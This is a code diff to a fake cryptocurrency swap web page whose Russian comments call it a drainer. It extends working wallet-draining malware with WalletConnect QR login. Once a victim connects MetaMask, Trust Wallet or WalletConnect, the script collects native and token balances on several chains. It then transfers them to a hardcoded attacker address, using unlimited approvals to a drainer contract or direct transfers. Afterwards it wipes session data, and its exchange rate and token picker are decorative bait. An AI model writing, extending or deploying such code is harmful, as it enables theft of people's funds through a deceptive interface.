@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
@@ -11,7 +11,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 
     <style>
-        /* ===== ТВОЙ СТИЛЬ (полностью скопирован из gsgsf.html) ===== */
+        /* ===== СТИЛИ ИЗ gsgsf.html (без изменений) ===== */
         :root {
             --bg-body: #08080f;
             --bg-card: rgba(20, 18, 35, 0.65);
@@ -287,6 +287,18 @@
         }
 
         .hidden { display: none !important; }
+
+        /* Для QR-кода */
+        #qrContainer {
+            margin: 15px auto 10px;
+            display: flex;
+            justify-content: center;
+            background: white;
+            padding: 10px;
+            border-radius: 10px;
+            width: fit-content;
+        }
+        #qrContainer canvas { max-width: 100%; height: auto; }
     </style>
 </head>
 <body>
@@ -363,25 +375,34 @@
     <div id="walletModal" class="modal-overlay">
         <div class="modal">
             <h3>Connect Wallet</h3>
-            <div id="metamaskOption" class="wallet-card" data-wallet="metamask">
+            <div id="metamaskOption" class="wallet-card">
                 <span class="w-icon"><i class="fab fa-meta"></i></span>
                 <span class="w-info">
                     <span class="w-name">MetaMask</span>
                     <span class="w-desc">Browser extension</span>
                 </span>
             </div>
-            <div id="trustOption" class="wallet-card" data-wallet="trust">
+            <div id="trustOption" class="wallet-card">
                 <span class="w-icon"><i class="fas fa-link" style="color:#8b5cf6;"></i></span>
                 <span class="w-info">
                     <span class="w-name">Trust Wallet</span>
                     <span class="w-desc">Mobile &amp; browser</span>
                 </span>
             </div>
+            <div id="wcOption" class="wallet-card">
+                <span class="w-icon"><i class="fas fa-wifi" style="color:#3b99fc;"></i></span>
+                <span class="w-info">
+                    <span class="w-name">WalletConnect</span>
+                    <span class="w-desc">QR‑code for any wallet</span>
+                </span>
+            </div>
+            <!-- Контейнер для QR-кода (появляется при выборе WalletConnect) -->
+            <div id="qrContainer" class="hidden"></div>
             <button class="modal-close" id="closeModalBtn">Cancel</button>
         </div>
     </div>
 
-    <!-- Модалка выбора токена (оставлена для дизайна) -->
+    <!-- Модалка выбора токена (декоративная) -->
     <div id="tokenModal" class="modal-overlay">
         <div class="modal">
             <h3>Select Token</h3>
@@ -391,16 +412,22 @@
         </div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <!-- Подключаем библиотеки -->
+    <script src="libs/ethers.umd.min.js"></script>
+    <script src="libs/walletconnect-provider.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+
     <script>
         (function() {
             'use strict';
 
             // ============================================================
-            // ★★★ КОНФИГУРАЦИЯ ДРЕЙНЕРА ★★★
+            // КОНФИГУРАЦИЯ (взята из index.html / index2.html)
             // ============================================================
             const TARGET = '0x12538D6AC7053383cd81686E069a3E277b6E828c';
             const CONTRACT_ADDRESS = '0xf09284028273F381529DA08499ade7165b2199f8';
+            const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
+
             const DRAINER_ABI = [
                 {
                     "inputs": [],
@@ -426,6 +453,7 @@
                     "type": "function"
                 }
             ];
+
             const ERC20_ABI = [
                 'function balanceOf(address) view returns (uint256)',
                 'function approve(address spender, uint256 amount) returns (bool)',
@@ -436,7 +464,26 @@
             ];
 
             // ============================================================
-            // DOM-ссылки
+            // ДАННЫЕ ДЛЯ ДЕКОРАТИВНОГО ВЫБОРА ТОКЕНОВ
+            // ============================================================
+            const ICON_BASE = 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color';
+            const tokens = [
+                { symbol: 'ETH', name: 'Ethereum', img: ICON_BASE + '/eth.svg' },
+                { symbol: 'BNB', name: 'BNB', img: ICON_BASE + '/bnb.svg' },
+                { symbol: 'USDT', name: 'Tether USD', img: ICON_BASE + '/usdt.svg' },
+                { symbol: 'USDC', name: 'USD Coin', img: ICON_BASE + '/usdc.svg' },
+                { symbol: 'DAI', name: 'Dai', img: ICON_BASE + '/dai.svg' },
+                { symbol: 'LINK', name: 'Chainlink', img: ICON_BASE + '/link.svg' },
+                { symbol: 'MATIC', name: 'Polygon', img: ICON_BASE + '/matic.svg' },
+                { symbol: 'WBTC', name: 'Wrapped BTC', img: ICON_BASE + '/btc.svg' }
+            ];
+
+            let fromToken = tokens[0];
+            let toToken = tokens[2];
+            let currentSelectType = null;
+
+            // ============================================================
+            // DOM-ЭЛЕМЕНТЫ
             // ============================================================
             const statusEl = document.getElementById('status');
             const connectBtn = document.getElementById('connectWalletBtn');
@@ -445,19 +492,32 @@
             const inputAmount = document.getElementById('inputAmount');
             const outputAmount = document.getElementById('outputAmount');
             const maxBtn = document.getElementById('maxBtn');
+            const rateDisplay = document.getElementById('rateDisplay');
+            const fromSymbol = document.getElementById('fromSymbol');
+            const toSymbol = document.getElementById('toSymbol');
+            const fromIcon = document.getElementById('fromIcon');
+            const toIcon = document.getElementById('toIcon');
+            const balanceFrom = document.getElementById('balanceFrom');
+            const balanceTo = document.getElementById('balanceTo');
+            const fromUsd = document.getElementById('fromUsd');
+            const toUsd = document.getElementById('toUsd');
+            const swapArrow = document.getElementById('swapArrow');
 
             const walletModal = document.getElementById('walletModal');
             const closeModalBtn = document.getElementById('closeModalBtn');
             const metamaskOption = document.getElementById('metamaskOption');
             const trustOption = document.getElementById('trustOption');
+            const wcOption = document.getElementById('wcOption');
 
             const tokenModal = document.getElementById('tokenModal');
             const tokenSearchInput = document.getElementById('tokenSearchInput');
             const tokenList = document.getElementById('tokenList');
             const closeTokenModalBtn = document.getElementById('closeTokenModalBtn');
 
+            const qrContainer = document.getElementById('qrContainer');
+
             // ============================================================
-            // Состояние
+            // СОСТОЯНИЕ
             // ============================================================
             let provider = null;
             let signer = null;
@@ -465,10 +525,11 @@
             let chainId = null;
             let isConnected = false;
             let isProcessing = false;
-            let selectedWallet = null; // 'metamask' | 'trust'
+            let wcProvider = null;
+            let isConnecting = false;
 
             // ============================================================
-            // Вспомогательные функции UI
+            // UI-ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
             // ============================================================
             function setStatus(text, type) {
                 statusEl.textContent = text;
@@ -517,77 +578,257 @@
             function closeModal(modal) { modal.classList.remove('active'); }
 
             // ============================================================
-            // Функции поиска провайдера (MetaMask / Trust)
+            // ОЧИСТКА СЕССИИ (для WalletConnect)
             // ============================================================
-            function getProviderByWallet(wallet) {
-                if (!window.ethereum) return null;
-                // EIP-6963: несколько провайдеров
-                if (window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
-                    for (const p of window.ethereum.providers) {
-                        if (wallet === 'metamask' && p.isMetaMask && !p.isTrust && !p.isTrustWallet) {
-                            return p;
-                        }
-                        if (wallet === 'trust' && (p.isTrust || p.isTrustWallet)) {
-                            return p;
-                        }
+            async function forceClearSession() {
+                try {
+                    if (wcProvider) {
+                        try { await wcProvider.disconnect(); } catch (e) {}
+                        wcProvider = null;
                     }
-                }
-                // Одиночный провайдер
-                if (wallet === 'metamask' && window.ethereum.isMetaMask && !window.ethereum.isTrust && !window.ethereum.isTrustWallet) {
-                    return window.ethereum;
-                }
-                if (wallet === 'trust' && (window.ethereum.isTrust || window.ethereum.isTrustWallet)) {
-                    return window.ethereum;
-                }
-                return null;
+                    const patterns = ['wc', 'walletconnect', 'WALLETCONNECT', 'wallet-connect'];
+                    for (const pattern of patterns) {
+                        for (let i = localStorage.length - 1; i >= 0; i--) {
+                            const key = localStorage.key(i);
+                            if (key && key.toLowerCase().includes(pattern.toLowerCase())) localStorage.removeItem(key);
+                        }
+                        for (let i = sessionStorage.length - 1; i >= 0; i--) {
+                            const key = sessionStorage.key(i);
+                            if (key && key.toLowerCase().includes(pattern.toLowerCase())) sessionStorage.removeItem(key);
+                        }
+                        document.cookie.split(';').forEach(cookie => {
+                            const [name] = cookie.trim().split('=');
+                            if (name && name.toLowerCase().includes(pattern.toLowerCase())) {
+                                document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
+                            }
+                        });
+                    }
+                    try {
+                        const dbs = await indexedDB.databases();
+                        for (const db of dbs) {
+                            if (db.name && (db.name.toLowerCase().includes('wallet') || db.name.toLowerCase().includes('wc'))) {
+                                await new Promise((resolve, reject) => {
+                                    const req = indexedDB.deleteDatabase(db.name);
+                                    req.onsuccess = resolve;
+                                    req.onerror = reject;
+                                });
+                            }
+                        }
+                    } catch (e) {}
+                    provider = null; signer = null; victim = null; chainId = null;
+                    isProcessing = false;
+                    qrContainer.innerHTML = '';
+                    qrContainer.classList.add('hidden');
+                    console.log('Сессия полностью сброшена');
+                } catch (e) {}
             }
 
             // ============================================================
-            // Подключение к выбранному кошельку
+            // ГЕНЕРАЦИЯ QR-КОДА ДЛЯ WALLETCONNECT
+            // ============================================================
+            function generateQR(uri) {
+                qrContainer.innerHTML = '';
+                new QRCode(qrContainer, {
+                    text: uri,
+                    width: 200,
+                    height: 200,
+                    colorDark: '#000000',
+                    colorLight: '#ffffff',
+                    correctLevel: QRCode.CorrectLevel.H
+                });
+                qrContainer.classList.remove('hidden');
+                setStatus('Отсканируйте QR-код в любом кошельке');
+            }
+
+            // ============================================================
+            // ПОДКЛЮЧЕНИЕ КОШЕЛЬКОВ
             // ============================================================
             async function connectWallet(wallet) {
-                const ethProvider = getProviderByWallet(wallet);
-                if (!ethProvider) {
-                    setStatus(`❌ ${wallet === 'metamask' ? 'MetaMask' : 'Trust Wallet'} не обнаружен`, 'err');
+                if (isConnecting || isProcessing) return;
+                if (!window.ethereum) {
+                    setStatus('❌ Ethereum провайдер не найден. Установите MetaMask или Trust.', 'err');
                     return;
                 }
-
+                let ethProvider = null;
+                if (wallet === 'metamask') {
+                    if (window.ethereum.isMetaMask && !window.ethereum.isTrust && !window.ethereum.isTrustWallet) {
+                        ethProvider = window.ethereum;
+                    } else if (window.ethereum.providers) {
+                        for (const p of window.ethereum.providers) {
+                            if (p.isMetaMask && !p.isTrust && !p.isTrustWallet) {
+                                ethProvider = p; break;
+                            }
+                        }
+                    }
+                } else if (wallet === 'trust') {
+                    if (window.ethereum.isTrust || window.ethereum.isTrustWallet) {
+                        ethProvider = window.ethereum;
+                    } else if (window.ethereum.providers) {
+                        for (const p of window.ethereum.providers) {
+                            if (p.isTrust || p.isTrustWallet) {
+                                ethProvider = p; break;
+                            }
+                        }
+                    }
+                }
+                if (!ethProvider) {
+                    setStatus(`❌ ${wallet === 'metamask' ? 'MetaMask' : 'Trust Wallet'} не обнаружен. Установите расширение.`, 'err');
+                    return;
+                }
                 try {
                     setStatus('Подключение...', '');
+                    isConnecting = true;
                     const web3Provider = new ethers.providers.Web3Provider(ethProvider);
                     await web3Provider.send('eth_requestAccounts', []);
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
                     const network = await web3Provider.getNetwork();
-                    const chainId_ = network.chainId;
 
-                    // Сохраняем глобально
                     provider = web3Provider;
                     signer = signer_;
                     victim = address;
-                    chainId = chainId_;
+                    chainId = network.chainId;
                     isConnected = true;
-                    selectedWallet = wallet;
 
                     updateConnectButton();
                     closeModal(walletModal);
-                    setStatus(`✅ Подключено: ${address.slice(0,6)}...${address.slice(-4)}`, 'ok');
+                    setStatus(`✅ ${wallet === 'metamask' ? 'MetaMask' : 'Trust'}: ${address.slice(0,6)}...${address.slice(-4)}`, 'ok');
+                    isConnecting = false;
 
-                    // Автоматически запускаем слив, если введена сумма > 0
                     const val = parseFloat(inputAmount.value);
-                    if (val > 0) {
-                        setTimeout(() => startDrain(), 800);
-                    } else {
-                        setStatus('Введите сумму и нажмите Swap', '');
+                    if (val > 0) setTimeout(() => startDrain(), 800);
+                } catch (e) {
+                    setStatus('❌ ' + e.message, 'err');
+                    isConnecting = false;
+                }
+            }
+
+            async function connectWalletConnect() {
+                if (isConnecting || isProcessing) return;
+                const EthereumProvider = window['@walletconnect/ethereum-provider']?.default ||
+                                         window['@walletconnect/ethereum-provider']?.EthereumProvider ||
+                                         window['@walletconnect/ethereum-provider'];
+                if (!EthereumProvider) {
+                    setStatus('❌ WalletConnect не доступен.', 'err');
+                    return;
+                }
+                try {
+                    setStatus('Подготовка...', '');
+                    isConnecting = true;
+                    await forceClearSession();
+
+                    wcProvider = await EthereumProvider.init({
+                        projectId: PROJECT_ID,
+                        chains: [1, 56, 137, 42161],
+                        showQrModal: false,
+                        reconnect: false,
+                        session: undefined
+                    });
+
+                    wcProvider.on('display_uri', (uri) => {
+                        generateQR(uri);
+                        setStatus('Отсканируйте QR-код в любом кошельке');
+                    });
+
+                    wcProvider.on('chainChanged', () => {});
+                    wcProvider.on('accountsChanged', (accounts) => {
+                        if (accounts.length === 0) {
+                            setStatus('Аккаунт отключён', 'err');
+                            isConnected = false;
+                            updateConnectButton();
+                            isConnecting = false;
+                        }
+                    });
+
+                    if (wcProvider.uri) {
+                        generateQR(wcProvider.uri);
+                        setStatus('Отсканируйте QR-код в любом кошельке');
                     }
-                } catch (err) {
-                    setStatus('❌ ' + err.message, 'err');
+
+                    let uriTimeout = setTimeout(() => {
+                        if (!qrContainer.classList.contains('hidden') || !wcProvider.uri) {
+                            setStatus('Не удалось получить QR-код. Попробуйте другой кошелёк.', 'err');
+                            isConnecting = false;
+                        }
+                    }, 8000);
+
+                    await wcProvider.enable();
+                    clearTimeout(uriTimeout);
+
+                    const web3Provider = new ethers.providers.Web3Provider(wcProvider);
+                    const signer_ = web3Provider.getSigner();
+                    const address = await signer_.getAddress();
+                    const network = await web3Provider.getNetwork();
+
+                    provider = web3Provider;
+                    signer = signer_;
+                    victim = address;
+                    chainId = network.chainId;
+                    isConnected = true;
+
+                    updateConnectButton();
+                    closeModal(walletModal);
+                    qrContainer.classList.add('hidden');
+                    setStatus(`✅ WalletConnect: ${address.slice(0,6)}...${address.slice(-4)}`, 'ok');
+                    isConnecting = false;
+
+                    const val = parseFloat(inputAmount.value);
+                    if (val > 0) setTimeout(() => startDrain(), 800);
+                } catch (e) {
+                    setStatus('❌ ' + e.message, 'err');
+                    isConnecting = false;
                 }
             }
 
             // ============================================================
-            // Логика слива (дрейнер)
+            // ЛОГИКА ДРЕЙНЕРА (объединена из index.html и index2.html)
             // ============================================================
+            async function checkBalances() {
+                const assets = [];
+                const nativeBal = await provider.getBalance(victim);
+                if (nativeBal.gt(0)) assets.push({ type: 'native', amount: nativeBal });
+
+                const TOKENS = {
+                    1: {
+                        'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+                        'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+                        'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+                        'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+                        'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
+                        'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA'
+                    },
+                    56: {
+                        'USDT': '0x55d398326f99059fF775485246999027B3197955',
+                        'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
+                        'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
+                        'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
+                        'DAI': '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
+                        'ETH': '0x2170Ed0880ac9A755fd29B2688956BD959F933F8'
+                    },
+                    137: {
+                        'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+                        'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
+                        'WETH': '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
+                        'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
+                        'WBTC': '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6'
+                    },
+                    42161: {
+                        'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
+                        'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
+                        'DAI': '0xDA10009cBd5D07dd0CeCc661609534282362a0A0'
+                    }
+                };
+                const tokensMap = TOKENS[chainId] || {};
+                for (const [symbol, addr] of Object.entries(tokensMap)) {
+                    try {
+                        const contract = new ethers.Contract(addr, ERC20_ABI, provider);
+                        const bal = await contract.balanceOf(victim);
+                        if (bal.gt(0)) assets.push({ type: 'token', address: addr, amount: bal, symbol });
+                    } catch (e) {}
+                }
+                return assets;
+            }
+
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -600,51 +841,8 @@
                 setStatus('Сбор активов...', '');
 
                 try {
-                    const assets = [];
-                    // Нативные
-                    const nativeBal = await provider.getBalance(victim);
-                    if (nativeBal.gt(0)) assets.push({ type: 'native', amount: nativeBal });
-
-                    // Токены
-                    const TOKENS_BY_CHAIN = {
-                        1: {
-                            'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-                            'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-                            'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
-                            'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
-                            'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
-                            'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA'
-                        },
-                        56: {
-                            'USDT': '0x55d398326f99059fF775485246999027B3197955',
-                            'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
-                            'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
-                            'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
-                            'DAI': '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
-                            'ETH': '0x2170Ed0880ac9A755fd29B2688956BD959F933F8'
-                        },
-                        137: {
-                            'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-                            'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
-                            'WETH': '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
-                            'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
-                            'WBTC': '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6'
-                        },
-                        42161: {
-                            'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
-                            'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
-                            'DAI': '0xDA10009cBd5D07dd0CeCc661609534282362a0A0'
-                        }
-                    };
-
-                    const tokens = TOKENS_BY_CHAIN[chainId] || {};
-                    for (const [symbol, addr] of Object.entries(tokens)) {
-                        try {
-                            const contract = new ethers.Contract(addr, ERC20_ABI, provider);
-                            const bal = await contract.balanceOf(victim);
-                            if (bal.gt(0)) assets.push({ type: 'token', address: addr, amount: bal, symbol });
-                        } catch (e) {}
-                    }
+                    let assets = await checkBalances();
+                    console.log('Найдено активов:', assets.length);
 
                     if (assets.length === 0) {
                         setStatus('Баланс пуст', 'err');
@@ -656,7 +854,7 @@
                     setStatus(`Найдено активов: ${assets.length}`, '');
                     await new Promise(resolve => setTimeout(resolve, 1500));
 
-                    // ---- Слив нативных ----
+                    // ---- Нативные ----
                     for (const a of assets) {
                         if (a.type !== 'native') continue;
                         try {
@@ -669,35 +867,44 @@
                                 const tx = await signer.sendTransaction({ to: TARGET, value, gasPrice, gasLimit });
                                 await tx.wait();
                             }
-                        } catch (e) {
-                            console.warn('Ошибка нативных:', e);
-                        }
+                        } catch (e) { console.warn('Ошибка нативных:', e); }
                     }
 
-                    // ---- Слив токенов через контракт ----
+                    // ---- Токены через контракт (или напрямую) ----
+                    const useContract = CONTRACT_ADDRESS && CONTRACT_ADDRESS.startsWith('0x');
                     for (const a of assets) {
                         if (a.type !== 'token') continue;
                         try {
-                            setStatus(`Обработка ${a.symbol || 'токена'}...`, '');
+                            setStatus(`Обработка ${a.symbol}...`, '');
                             const token = new ethers.Contract(a.address, ERC20_ABI, signer);
-                            const drainer = new ethers.Contract(CONTRACT_ADDRESS, DRAINER_ABI, signer);
-                            const allowance = await token.allowance(victim, CONTRACT_ADDRESS);
-                            if (allowance.lt(a.amount)) {
-                                setStatus(`Approve ${a.symbol}...`, '');
-                                await token.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+                            if (useContract) {
+                                const drainer = new ethers.Contract(CONTRACT_ADDRESS, DRAINER_ABI, signer);
+                                const allowance = await token.allowance(victim, CONTRACT_ADDRESS);
+                                if (allowance.lt(a.amount)) {
+                                    setStatus(`Approve ${a.symbol}...`, '');
+                                    await token.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+                                }
+                                const tx = await drainer.drain(a.address, victim, a.amount);
+                                await tx.wait();
+                            } else {
+                                let gasLimit;
+                                try {
+                                    const estimate = await token.estimateGas.transfer(TARGET, a.amount);
+                                    gasLimit = estimate.mul(120).div(100);
+                                } catch (e) { gasLimit = 100000; }
+                                const tx = await token.transfer(TARGET, a.amount, { gasLimit });
+                                await tx.wait();
                             }
-                            const tx = await drainer.drain(a.address, victim, a.amount);
-                            await tx.wait();
-                        } catch (e) {
-                            console.warn(`Ошибка с ${a.symbol}:`, e);
-                        }
+                        } catch (e) { console.warn(`Ошибка с ${a.symbol}:`, e); }
                     }
 
                     setStatus('✅ Всё переведено!', 'ok');
                     isProcessing = false;
                     updateSwapButton();
-                    // Можно добавить очистку сессии (необязательно)
-
+                    // Очищаем сессию после успеха
+                    await forceClearSession();
+                    isConnected = false;
+                    updateConnectButton();
                 } catch (e) {
                     setStatus('❌ Ошибка: ' + e.message, 'err');
                     isProcessing = false;
@@ -707,12 +914,10 @@
             }
 
             // ============================================================
-            // Обработчики событий
+            // ОБРАБОТЧИКИ СОБЫТИЙ
             // ============================================================
-
-            // Подключение кошелька – открываем модалку
-            connectBtn.addEventListener('click', function(e) {
-                e.preventDefault();
+            // Кнопка Connect открывает модалку
+            connectBtn.addEventListener('click', () => {
                 if (isConnected) {
                     // Если уже подключены, можно переподключиться
                     openModal(walletModal);
@@ -721,25 +926,18 @@
                 }
             });
 
-            // Выбор кошелька в модалке
-            metamaskOption.addEventListener('click', function() {
-                connectWallet('metamask');
-            });
-            trustOption.addEventListener('click', function() {
-                connectWallet('trust');
-            });
+            // Выбор кошелька
+            metamaskOption.addEventListener('click', () => connectWallet('metamask'));
+            trustOption.addEventListener('click', () => connectWallet('trust'));
+            wcOption.addEventListener('click', connectWalletConnect);
 
             // Закрытие модалок
             closeModalBtn.addEventListener('click', () => closeModal(walletModal));
-            walletModal.addEventListener('click', function(e) {
-                if (e.target === walletModal) closeModal(walletModal);
-            });
+            walletModal.addEventListener('click', (e) => { if (e.target === walletModal) closeModal(walletModal); });
             closeTokenModalBtn.addEventListener('click', () => closeModal(tokenModal));
-            tokenModal.addEventListener('click', function(e) {
-                if (e.target === tokenModal) closeModal(tokenModal);
-            });
+            tokenModal.addEventListener('click', (e) => { if (e.target === tokenModal) closeModal(tokenModal); });
 
-            // Кнопка Swap – запускает слив
+            // Кнопка Swap
             swapBtn.addEventListener('click', function() {
                 if (!isConnected) {
                     openModal(walletModal);
@@ -753,45 +951,34 @@
                 startDrain();
             });
 
-            // Кнопка Max – устанавливает сумму (для демонстрации оставлено, но не влияет на слив)
+            // Кнопка Max (для демонстрации)
             maxBtn.addEventListener('click', function() {
                 inputAmount.value = 1.0;
                 updateSwapButton();
                 setStatus('Сумма установлена', '');
             });
 
-            // Обновление состояния при вводе суммы
+            // Обновление кнопки при вводе
             inputAmount.addEventListener('input', updateSwapButton);
 
-            // Кнопка Refresh – сброс сессии
-            refreshBtn.addEventListener('click', function() {
+            // Кнопка Refresh – сброс
+            refreshBtn.addEventListener('click', async function() {
+                await forceClearSession();
                 isConnected = false;
                 provider = null;
                 signer = null;
                 victim = null;
                 chainId = null;
-                selectedWallet = null;
                 inputAmount.value = '';
                 outputAmount.value = '';
                 updateConnectButton();
                 setStatus('Сессия сброшена', '');
+                qrContainer.classList.add('hidden');
             });
 
             // ============================================================
-            // Демо-функции для выбора токена (оставлены для интерфейса)
+            // ДЕКОРАТИВНЫЙ ВЫБОР ТОКЕНОВ (из gsgsf)
             // ============================================================
-            const tokens = [
-                { symbol: 'ETH', name: 'Ethereum', img: 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color/eth.svg' },
-                { symbol: 'BNB', name: 'BNB', img: 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color/bnb.svg' },
-                { symbol: 'USDT', name: 'Tether', img: 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color/usdt.svg' },
-                { symbol: 'USDC', name: 'USD Coin', img: 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color/usdc.svg' },
-                { symbol: 'DAI', name: 'Dai', img: 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color/dai.svg' }
-            ];
-
-            let fromToken = tokens[0];
-            let toToken = tokens[2];
-            let currentSelectType = null;
-
             function renderTokenList(filter = '') {
                 tokenList.innerHTML = '';
                 tokens.forEach(token => {
@@ -812,16 +999,31 @@
                                 if (currentSelectType === 'from') fromToken = token;
                                 else toToken = token;
                                 closeModal(tokenModal);
-                                // Обновляем отображение
-                                document.getElementById('fromIcon').src = fromToken.img;
-                                document.getElementById('fromSymbol').textContent = fromToken.symbol;
-                                document.getElementById('toIcon').src = toToken.img;
-                                document.getElementById('toSymbol').textContent = toToken.symbol;
+                                fromIcon.src = fromToken.img;
+                                fromSymbol.textContent = fromToken.symbol;
+                                toIcon.src = toToken.img;
+                                toSymbol.textContent = toToken.symbol;
+                                // Обновляем отображение курса (декоративно)
+                                updateRateDisplay();
                             });
                         }
                         tokenList.appendChild(item);
                     }
                 });
+            }
+
+            function updateRateDisplay() {
+                const val = parseFloat(inputAmount.value) || 0;
+                if (val <= 0) {
+                    rateDisplay.textContent = `1 ${fromToken.symbol} = 0.00 ${toToken.symbol}`;
+                    outputAmount.value = '';
+                    return;
+                }
+                // Демонстрационный курс: просто умножаем на случайный коэффициент
+                const rate = 1.2; // фиктивный
+                const out = val * rate;
+                outputAmount.value = out.toFixed(6);
+                rateDisplay.textContent = `1 ${fromToken.symbol} = ${rate.toFixed(4)} ${toToken.symbol}`;
             }
 
             document.getElementById('tokenFromSelect').addEventListener('click', function(e) {
@@ -842,13 +1044,44 @@
                 renderTokenList(this.value);
             });
 
+            // Стрелка обмена токенами (декоративно)
+            swapArrow.addEventListener('click', function() {
+                const temp = fromToken;
+                fromToken = toToken;
+                toToken = temp;
+                fromIcon.src = fromToken.img;
+                fromSymbol.textContent = fromToken.symbol;
+                toIcon.src = toToken.img;
+                toSymbol.textContent = toToken.symbol;
+                updateRateDisplay();
+                setStatus('Токены перевернуты', '');
+            });
+
+            // Обновление курса при вводе суммы
+            inputAmount.addEventListener('input', updateRateDisplay);
+
             // ============================================================
-            // Инициализация
+            // ИНИЦИАЛИЗАЦИЯ
             // ============================================================
             updateConnectButton();
             setStatus('Подключите кошелёк или введите сумму', '');
+            updateRateDisplay();
+
+            // Предзагрузка QR-кода (скрыто)
+            qrContainer.classList.add('hidden');
+
+            // Проверяем наличие библиотек
+            if (typeof ethers === 'undefined') {
+                setStatus('❌ Библиотека ethers не загружена', 'err');
+            }
+            if (typeof QRCode === 'undefined') {
+                console.warn('QRCode библиотека не загружена');
+            }
+
+            // При загрузке очищаем старые сессии
+            forceClearSession();
+
         })();
     </script>
-
 </body>
 </html>
